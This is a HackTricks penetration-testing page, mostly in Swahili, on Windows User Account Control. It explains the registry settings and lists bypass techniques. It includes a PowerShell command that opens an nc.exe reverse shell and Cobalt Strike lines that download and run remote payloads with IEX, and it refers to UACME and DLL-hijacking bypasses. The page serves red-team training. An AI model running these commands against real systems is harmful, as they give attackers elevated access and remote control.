# UAC - User Account Control

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **kuonyeshwa kwa idhini kwa shughuli za juu**. Programu zina viwango tofauti vya `integrity`, na programu yenye **kiwango cha juu** inaweza kufanya kazi ambazo **zinaweza kuathiri mfumo**. Wakati UAC imewezeshwa, programu na kazi kila wakati **zinafanya kazi chini ya muktadha wa usalama wa akaunti isiyo ya msimamizi** isipokuwa msimamizi aidhinishe waziwazi programu/hizi kazi kuwa na ufikiaji wa kiwango cha msimamizi kwenye mfumo ili kuendesha. Ni kipengele cha urahisi kinacholinda wasimamizi kutokana na mabadiliko yasiyokusudiwa lakini hakichukuliwi kama mpaka wa usalama.

Kwa maelezo zaidi kuhusu viwango vya integrity:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

Wakati UAC iko katika nafasi, mtumiaji wa msimamizi anapewa token 2: ufunguo wa mtumiaji wa kawaida, ili kufanya vitendo vya kawaida kama kiwango cha kawaida, na mmoja wenye haki za msimamizi.

Hii [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) inajadili jinsi UAC inavyofanya kazi kwa undani mkubwa na inajumuisha mchakato wa kuingia, uzoefu wa mtumiaji, na usanifu wa UAC. Wasimamizi wanaweza kutumia sera za usalama kuunda jinsi UAC inavyofanya kazi maalum kwa shirika lao katika ngazi ya ndani (wakati wa kutumia secpol.msc), au kuundwa na kusukumwa kupitia Vitu vya Sera za Kundi (GPO) katika mazingira ya Active Directory. Mipangilio mbalimbali inajadiliwa kwa undani [hapa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Kuna mipangilio 10 ya Sera za Kundi ambayo inaweza kuwekwa kwa UAC. Jedwali lifuatalo linatoa maelezo zaidi:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Imezuiliwa                                                  |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Imezuiliwa                                                  |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Kuuliza idhini kwa binaries zisizo za Windows               |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Kuuliza hati kwenye desktop salama                          |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Imewezeshwa (default kwa nyumbani) Imezuiliwa (default kwa biashara) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Imezuiliwa                                                  |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Imewezeshwa                                                |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Imewezeshwa                                                |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Imewezeshwa                                                |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Imewezeshwa                                                |

### UAC Bypass Theory

Baadhi ya programu zina **autoelevated automatically** ikiwa **mtumiaji ni** sehemu ya **kikundi cha wasimamizi**. Binaries hizi zina ndani ya _**Manifests**_ chaguo la _**autoElevate**_ lenye thamani _**True**_. Binary lazima iwe **imewekwa saini na Microsoft** pia.

Kisha, ili **kuepuka** **UAC** (kuinua kutoka **kiwango cha kati** cha integrity **hadi juu**) baadhi ya washambuliaji hutumia aina hii ya binaries ili **kutekeleza msimbo wowote** kwa sababu itatekelezwa kutoka kwa **mchakato wa integrity wa kiwango cha juu**.

Unaweza **kuangalia** _**Manifest**_ ya binary ukitumia zana _**sigcheck.exe**_ kutoka Sysinternals. Na unaweza **kuona** **kiwango cha integrity** cha michakato ukitumia _Process Explorer_ au _Process Monitor_ (ya Sysinternals).

### Check UAC

Ili kuthibitisha ikiwa UAC imewezeshwa fanya:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Ikiwa ni **`1`** basi UAC ni **imewashwa**, ikiwa ni **`0`** au haipo, basi UAC ni **haijawashwa**.

Kisha, angalia **ni kiwango gani** kimewekwa:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* Ikiwa **`0`** basi, UAC haitatoa ujumbe (kama **imezimwa**)
* Ikiwa **`1`** msimamizi **anaulizwa jina la mtumiaji na nenosiri** ili kutekeleza faili ya binary kwa haki za juu (katika Desktop Salama)
* Ikiwa **`2`** (**Nijulishe kila wakati**) UAC kila wakati itauliza uthibitisho kwa msimamizi anapojaribu kutekeleza kitu chenye mamlaka ya juu (katika Desktop Salama)
* Ikiwa **`3`** kama `1` lakini si lazima kwenye Desktop Salama
* Ikiwa **`4`** kama `2` lakini si lazima kwenye Desktop Salama
* ikiwa **`5`**(**kawaida**) itauliza msimamizi kuthibitisha kuendesha binaries zisizo za Windows kwa mamlaka ya juu

Kisha, unapaswa kuangalia thamani ya **`LocalAccountTokenFilterPolicy`**\
Ikiwa thamani ni **`0`**, basi, mtumiaji wa **RID 500** (**Msimamizi wa ndani**) anaweza kufanya **kazi za usimamizi bila UAC**, na ikiwa ni `1`, **akaunti zote ndani ya kundi "Administrators"** zinaweza kufanya hivyo.

Na, hatimaye angalia thamani ya funguo **`FilterAdministratorToken`**\
Ikiwa **`0`**(kawaida), akaunti ya **Msimamizi wa ndani inaweza** kufanya kazi za usimamizi wa mbali na ikiwa **`1`** akaunti ya msimamizi wa ndani **haiwezi** kufanya kazi za usimamizi wa mbali, isipokuwa `LocalAccountTokenFilterPolicy` imewekwa kuwa `1`.

#### Muhtasari

* Ikiwa `EnableLUA=0` au **haipo**, **hakuna UAC kwa mtu yeyote**
* Ikiwa `EnableLua=1` na **`LocalAccountTokenFilterPolicy=1` , Hakuna UAC kwa mtu yeyote**
* Ikiwa `EnableLua=1` na **`LocalAccountTokenFilterPolicy=0` na `FilterAdministratorToken=0`, Hakuna UAC kwa RID 500 (Msimamizi wa ndani)**
* Ikiwa `EnableLua=1` na **`LocalAccountTokenFilterPolicy=0` na `FilterAdministratorToken=1`, UAC kwa kila mtu**

Taarifa hii yote inaweza kukusanywa kwa kutumia moduli ya **metasploit**: `post/windows/gather/win_privs`

Unaweza pia kuangalia makundi ya mtumiaji wako na kupata kiwango cha uaminifu:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

{% hint style="info" %}
Kumbuka kwamba ikiwa una ufikiaji wa picha kwa mwathirika, UAC bypass ni rahisi kwani unaweza kubofya tu "Ndio" wakati ujumbe wa UAC unapoonekana
{% endhint %}

UAC bypass inahitajika katika hali zifuatazo: **UAC imewashwa, mchakato wako unafanya kazi katika muktadha wa uaminifu wa kati, na mtumiaji wako ni sehemu ya kundi la wasimamizi**.

Ni muhimu kutaja kwamba ni **vigumu zaidi kupita UAC ikiwa iko katika kiwango cha juu cha usalama (Daima) kuliko ikiwa iko katika viwango vingine vyovyote (Kawaida).**

### UAC disabled

Ikiwa UAC tayari imezimwa (`ConsentPromptBehaviorAdmin` ni **`0`**) unaweza **kutekeleza shell ya kinyume na ruhusa za admin** (kiwango cha juu cha uaminifu) ukitumia kitu kama:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Sana** Msingi UAC "bypass" (ufikiaji wa mfumo wa faili kamili)

Ikiwa una shell na mtumiaji ambaye yuko ndani ya kundi la Wasimamizi unaweza **kuunganisha C$** iliyoshirikiwa kupitia SMB (mfumo wa faili) ndani ya diski mpya na utakuwa na **ufikiaji wa kila kitu ndani ya mfumo wa faili** (hata folda ya nyumbani ya Msimamizi).

{% hint style="warning" %}
**Inaonekana kama hila hii haitumiki tena**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Mbinu za Cobalt Strike zitaweza kufanya kazi tu ikiwa UAC haijawekwa kwenye kiwango chake cha juu cha usalama.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** na **Metasploit** pia zina moduli kadhaa za **kuepuka** **UAC**.

### KRBUACBypass

Hati na zana katika [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME**](https://github.com/hfiref0x/UACME) ambayo ni **mkusanyiko** wa exploits kadhaa za UAC bypass. Kumbuka kwamba utahitaji **kukusanya UACME ukitumia visual studio au msbuild**. Kukusanya kutaunda executable kadhaa (kama `Source\Akagi\outout\x64\Debug\Akagi.exe`), utahitaji kujua **ni ipi unahitaji.**\
Unapaswa **kuwa makini** kwa sababu baadhi ya kuepuka kutatoa **maonyo kwa programu nyingine** ambazo zita **onya** **mtumiaji** kwamba kuna kitu kinatokea.

UACME ina **toleo la kujenga ambalo kila mbinu ilianza kufanya kazi**. Unaweza kutafuta mbinu inayohusisha toleo lako:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Also, using [this](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) page you get the Windows release `1607` from the build versions.

#### More UAC bypass

**All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).

You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:

![](<../../.gitbook/assets/image (863).png>)

(_explorer.exe_ inapaswa kufanya kazi)

### UAC Bypass with GUI

Ikiwa una ufikiaji wa **GUI unaweza tu kukubali ujumbe wa UAC** unapoupata, huwezi kweli kuhitaji bypass. Hivyo, kupata ufikiaji wa GUI kutakuruhusu kupita UAC.

Zaidi ya hayo, ikiwa unapata kikao cha GUI ambacho mtu alikuwa akitumia (labda kupitia RDP) kuna **zana fulani ambazo zitakuwa zinaendesha kama msimamizi** ambapo unaweza **kufanya** **cmd** kwa mfano **kama admin** moja kwa moja bila kuombwa tena na UAC kama [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Hii inaweza kuwa ya **kujificha** zaidi.

### Noisy brute-force UAC bypass

Ikiwa hujali kuhusu kuwa na kelele unaweza kila wakati **kufanya kitu kama** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) ambacho **kinauliza kuongeza ruhusa hadi mtumiaji akubali**.

### Your own bypass - Basic UAC bypass methodology

Ikiwa utaangalia **UACME** utaona kwamba **mara nyingi UAC bypasses inatumia udhaifu wa Dll Hijacking** (hasa kuandika dll mbaya kwenye _C:\Windows\System32_). [Soma hii kujifunza jinsi ya kupata udhaifu wa Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/).

1. Tafuta binary ambayo itafanya **autoelevate** (hakikisha kwamba wakati inatekelezwa inakimbia katika kiwango cha juu cha uaminifu).
2. Kwa procmon pata matukio ya "**NAME NOT FOUND**" ambayo yanaweza kuwa hatarini kwa **DLL Hijacking**.
3. Huenda ukahitaji **kuandika** DLL ndani ya **njia zilizolindwa** (kama C:\Windows\System32) ambapo huna ruhusa ya kuandika. Unaweza kupita hii kwa kutumia:
   1. **wusa.exe**: Windows 7,8 na 8.1. Inaruhusu kutoa maudhui ya faili ya CAB ndani ya njia zilizolindwa (kwa sababu chombo hiki kinatekelezwa kutoka kiwango cha juu cha uaminifu).
   2. **IFileOperation**: Windows 10.
4. Andaa **script** ya nakala ya DLL yako ndani ya njia iliyolindwa na kutekeleza binary hatarini na inayojiongezea.

### Another UAC bypass technique

Inahusisha kuangalia ikiwa **binary ya autoElevated** inajaribu **kusoma** kutoka **registry** jina/path ya **binary** au **amri** itakayotekelezwa (hii ni ya kuvutia zaidi ikiwa binary inatafuta habari hii ndani ya **HKCU**).

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
